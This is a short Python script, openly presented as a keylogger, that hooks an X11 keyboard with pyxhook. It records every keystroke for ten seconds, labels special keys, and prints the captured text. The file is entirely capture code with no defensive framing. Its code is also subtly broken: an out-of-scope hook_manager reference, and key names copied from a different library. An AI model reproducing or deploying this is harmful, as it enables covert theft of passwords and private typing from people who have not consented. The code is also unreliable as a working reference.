import pyxhook
import time

# Global variables
captured_keys = []
stop_event = False

# Function to handle key press events


def on_key_press(event):
    global captured_keys
    substitution = {
        'Key.enter': '[ENTER]\n',
        'Key.backspace': '[BACKSPACE]',
        'Key.space': ' ',
        'Key.alt_l': '[ALT]',
        'Key.tab': '[TAB]',
        'Key.delete': '[DEL]',
        'Key.ctrl_l': '[CTRL]',
        'Key.left': '[LEFT ARROW]',
        'Key.right': '[RIGHT ARROW]',
        'Key.shift': '[SHIFT]',
        '\\x13': '[CTRL-S]',
        '\\x17': '[CTRL-W]',
        'Key.caps_lock': '[CAPS LK]',
        '\\x01': '[CTRL-A]',
        'Key.cmd': '[WINDOWS KEY]',
        'Key.print_screen': '[PRNT SCR]',
        '\\x03': '[CTRL-C]',
        '\\x16': '[CTRL-V]'
    }

    key = str(event).strip('\'')
    if key in substitution:
        captured_keys.append(substitution[key])
    else:
        captured_keys.append(key)

    if stop_event:
        hook_manager.cancel()
        return False

# Function to start capturing keys


def start_keylogger(duration):
    global stop_event
    global captured_keys

    hook_manager = pyxhook.HookManager()
    hook_manager.KeyDown = on_key_press
    hook_manager.HookKeyboard()

    try:
        hook_manager.start()
        time.sleep(duration)
    except KeyboardInterrupt:
        pass

    stop_event = True
    hook_manager.cancel()
    return ''.join(captured_keys)


# Example usage: Capture keys for 10 seconds and print the log
duration = 10  # Set the duration in seconds
log = start_keylogger(duration)
print('Captured Keys:')
print(log)
